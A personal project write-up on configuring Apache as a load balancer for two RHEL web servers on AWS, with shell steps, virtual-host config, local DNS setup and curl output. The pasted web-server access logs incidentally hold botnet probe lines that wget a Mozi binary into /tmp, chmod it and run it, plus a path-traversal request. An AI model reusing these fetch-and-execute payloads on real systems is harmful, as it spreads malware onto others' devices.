## Load Balancer Solution With Apache

### **`Key point for me:`**

>Understanding of how load balancer is used to distribute traffic accross several web servers. And how it hides the complexity involved in users accessing sites with multiple IP Addresses and names, by providing a single point of access (single IP Address/name and distribute traffic in an optimal way).

<br/>

### `Tools, components and Infrastructure used for this project:`  
`Solution description:`
![infra](https://user-images.githubusercontent.com/70076627/119481614-d1cc7880-bd4a-11eb-8b2a-b86c38a6c669.PNG)

`Servers types to be used:`
- Two RHEL8 Web Servers
- One MySQL DB Server (based on Ubuntu 20.04)
- One RHEL8 NFS server

`Scope:` To enhance Tooling Website solution (set up in previous project) by adding a Load Balancer to disctribute traffic between Web Servers and allow users to access this website using a single URL.

<br/>

## Step 1: Configure Apache As A Load Balancer
- I spinned up an Ubuntu Server 20.04 EC2 instance to be used as my Load Balancer.

- I opened up port 80 by creating an Inbound Rule in the Security Group.

- Apache Load balancer installation:
> *root@ip-172-31-28-255:/home/ubuntu#apt update
root@ip-172-31-28-255:/home/ubuntu#apt install apache2 -y
root@ip-172-31-28-255:/home/ubuntu#apt-get install libxml2-dev*

- Enable modules:
> *root@ip-172-31-28-255:/home/ubuntu#a2enmod rewrite  
root@ip-172-31-28-255:/home/ubuntu#a2enmod proxy  
root@ip-172-31-28-255:/home/ubuntu#a2enmod proxy_balancer  
root@ip-172-31-28-255:/home/ubuntu#a2enmod proxy_http  
root@ip-172-31-28-255:/home/ubuntu#a2enmod headers  
root@ip-172-31-28-255:/home/ubuntu#a2enmod lbmethod_bytraffic*

> *root@ip-172-31-28-255:/home/ubuntu# systemctl restart apache2*

> *root@ip-172-31-28-255:/home/ubuntu# systemctl status apache2*

- Configure Load balancing, point traffic coming to LB to both Web servers:
> *root@ip-172-31-28-255:/home/ubuntu#  vi /etc/apache2/sites-available/000-default.conf*

```
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
...
...
...
<Proxy "balancer://mycluster">
               BalancerMember http://172.31.24.217:80 loadfactor=5 timeout=1
               BalancerMember http://172.31.19.10:80 loadfactor=5 timeout=1
               ProxySet lbmethod=bytraffic
               # ProxySet lbmethod=byrequests
</Proxy>

        ProxyPreserveHost On
        ProxyPass / balancer://mycluster/
        ProxyPassReverse / balancer://mycluster/
</VirtualHost>
```
> *root@ip-172-31-28-255:/home/ubuntu# systemctl restart apache2*

<br/>

Other lbmethod options are `bybusyness`, `byrequests`, `heartbeat`. and can also use `loadfactor` parameter for traffic distribution.

<br/>

To verify the configuration works:
I entered the LB Server IP in my browser:
http://Load-Balancer-Public-IP-Address-or-Public-DNS-Name>/index.php

![LB login page](https://user-images.githubusercontent.com/70076627/119485848-78b31380-bd4f-11eb-806b-5684142dc798.PNG)

![LB hompage](https://user-images.githubusercontent.com/70076627/119485864-7e105e00-bd4f-11eb-8786-abe42a1137b6.PNG)

<br/>

**In the previous project, I mounted /var/log/httpd/ from my Web Servers to the NFS server - I had to unmount to ensure each web server has its own log directory that will be populated.**

I opened console to each web server and ran the below command to be able to see my logs as I access the LB Server IP and refreshed the site a lot of times. The log showed how the LB server was sending requests to each of the web servers.

`ON WEBSERVER_1`

**[root@ip-172-31-24-217 ec2-user]# tail -f /var/log/httpd/access_log**
```
80.94.93.33 - - [20/May/2021:20:31:57 +0000] "GET /login.php HTTP/1.1" 200 715 "-" "libwww-perl
157.230.85.144 - - [20/May/2021:20:49:20 +0000] "GET /ab2g HTTP/1.1" 400 226 "-" "-"
185.53.90.19 - - [20/May/2021:20:52:24 +0000] "GET ../../proc/ HTTP" 400 226 "-" "-"
162.142.125.55 - - [20/May/2021:22:26:32 +0000] "GET / HTTP/1.1" 302 2455 "-" "-"
162.142.125.55 - - [20/May/2021:22:26:32 +0000] "GET / HTTP/1.1" 302 2455 "-" "Mozilla/5.0 (comsysInspect/1.1; +https://about.censys.io/)"

172.31.28.70 - - [21/May/2021:09:10:43 +0000] "GET /index.php HTTP/1.1" 302 2455 "-" "Mozilla/5NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
172.31.28.70 - - [21/May/2021:09:10:44 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "http://34.22in.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrom212 Safari/537.36

172.31.28.70 - - [21/May/2021:09:15:20 +0000] "GET /create_user.php HTTP/1.1" 200 1321 "http://34.222.133.88/admin_tooling.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"

172.31.28.70 - - [21/May/2021:09:15:20 +0000] "GET /create_user.php HTTP/1.1" 200 1321 "http://34.222.133.88/admin_tooling.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"


172.31.28.70 - - [21/May/2021:09:16:09 +0000] "POST /create_user.php HTTP/1.1" 302 1341 "http://34.222.133.88/create_user.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
172.31.28.70 - - [21/May/2021:09:16:10 +0000] "GET /admin_tooling.php HTTP/1.1" 200 2407 "http://34.222.133.88/create_user.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
```
<br/>

`ON WEBSERVER_2`

**[root@ip-172-31-19-10 ec2-user]# tail -f /var/log/httpd/access_log**
```
185.59.245.249 - - [20/May/2021:21:38:55 +0000] "GET / HTTP/1.1" 302 2455 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"

182.127.70.10 - - [21/May/2021:08:12:30 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
102.89.2.198 - - [21/May/2021:08:55:34 +0000] "GET /index.php HTTP/1.1" 302 2455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
102.89.2.198 - - [21/May/2021:08:55:35 +0000] "GET /login.php HTTP/1.1" 200 715 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
102.89.2.198 - - [21/May/2021:08:55:35 +0000] "GET /style.css HTTP/1.1" 200 1704 "http://54.212.40.229/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
102.89.2.198 - - [21/May/2021:08:55:36 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "http://54.212.40.229/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
102.89.2.101 - - [21/May/2021:08:56:26 +0000] "-" 408 - "-" "-"

172.31.28.70 - - [21/May/2021:09:23:13 +0000] "POST /login.php HTTP/1.1" 302 715 "http://34.222.133.88/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
172.31.28.70 - - [21/May/2021:09:23:13 +0000] "GET /login.php HTTP/1.1" 200 715 "http://34.222.133.88/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
172.31.28.70 - - [21/May/2021:09:23:37 +0000] "POST /login.php HTTP/1.1" 302 715 "http://34.222.133.88/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
172.31.28.70 - - [21/May/2021:09:23:37 +0000] "GET /admin_tooling.php HTTP/1.1" 200 2397 "http://34.222.133.88/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
112.171.130.213 - - [21/May/2021:09:28:45 +0000] "HEAD / HTTP/1.1" 302 - "-" "-"
112.171.130.213 - - [21/May/2021:09:28:46 +0000] "GET / HTTP/1.1" 302 2455 "-" "-"

192.241.206.224 - - [21/May/2021:09:42:17 +0000] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
61.242.40.232 - - [21/May/2021:09:42:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 196 "-" "Hello, world"
```

## Step 2: Optional Step - Configure Local DNS Names Resolution

 > *ubuntu@ip-172-31-28-70:~$ sudo su  
root@ip-172-31-28-70:/home/ubuntu# vi /etc/hosts  
root@ip-172-31-28-70:/home/ubuntu# cat /etc/hosts*
```
# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
172.31.24.217 Web1
172.31.19.10 Web2
```
- I updated my LB config file with the names of the web servers.

> *root@ip-172-31-28-70:/home/ubuntu# vi /etc/apache2/sites-available/000-default.conf*
```
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
...
...
...
        #Include conf-available/serve-cgi-bin.conf

        <Proxy "balancer://mycluster">
               BalancerMember http://Web1:80 loadfactor=5 timeout=1
               BalancerMember http://Web2:80 loadfactor=5 timeout=1
               ProxySet lbmethod=bytraffic
               #ProxySet lbmethod=byrequests
        </Proxy>

        ProxyPreserveHost On
        ProxyPass / balancer://mycluster/
        ProxyPassReverse / balancer://mycluster/

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

> *root@ip-172-31-28-70:/home/ubuntu# systemctl daemon-reload  
root@ip-172-31-28-70:/home/ubuntu# systemctl restart apache2*

<br/>

- I then used curl to access my the web servers:

> *root@ip-172-31-28-70:/home/ubuntu# **curl http://Web1***

```
<!DOCTYPE html>

<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="tooling_stylesheets.css">
   <script src="script.js"></script>
    <title> PROPITIX TOOLING</title>
</head>


<body>




<div class="header">

        </div>
        <div class="content">
                <!-- notification message -->
                                <!-- logged in user information -->
                <div class="profile_info">
                <!--    <img src="images/user_profile.png"  > -->

                        <div>
                                                        </div>
                </div>
        </div>






    <div class="Logo">

        <a href="index.php">
            <img src="img/logo-propitix.png" alt="" width="220" height="150">
            </a>
    </div>


    <h1> PROPITIX TOOLING WEBSITE </h1>
    <h2 id="test">Propitix.io</h2>



    <div class="container">
        <div class="box">
            <a href="https://jenkins.infra.zooto.io/" target="_blank">
                <img src="img/jenkins.png" alt="Snow" width="400" height="150">
            </a>
        </div>

        <div class="box">
            <a href="https://grafana.infra.zooto.io/" target="_blank">
                <img src="img/grafana.png" alt="Snow2" width="400" height="150">
            </a>
...
...
...
```

<br/>

> *root@ip-172-31-28-70:/home/ubuntu# **curl http://Web2***

```
<!DOCTYPE html>

<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="tooling_stylesheets.css">
   <script src="script.js"></script>
    <title> PROPITIX TOOLING</title>
</head>


<body>




<div class="header">

        </div>
        <div class="content">
                <!-- notification message -->
                                <!-- logged in user information -->
                <div class="profile_info">
                <!--    <img src="images/user_profile.png"  > -->

                        <div>
                                                        </div>
                </div>
        </div>






    <div class="Logo">

        <a href="index.php">
            <img src="img/logo-propitix.png" alt="" width="220" height="150">
            </a>
    </div>


    <h1> PROPITIX TOOLING WEBSITE </h1>
    <h2 id="test">Propitix.io</h2>



    <div class="container">
        <div class="box">
            <a href="https://jenkins.infra.zooto.io/" target="_blank">
                <img src="img/jenkins.png" alt="Snow" width="400" height="150">
            </a>
        </div>
...
...
...
```




`Note:` This is internal configuration and thus local to the LB server, they will not be resolvable from other servers internally nor from the internet.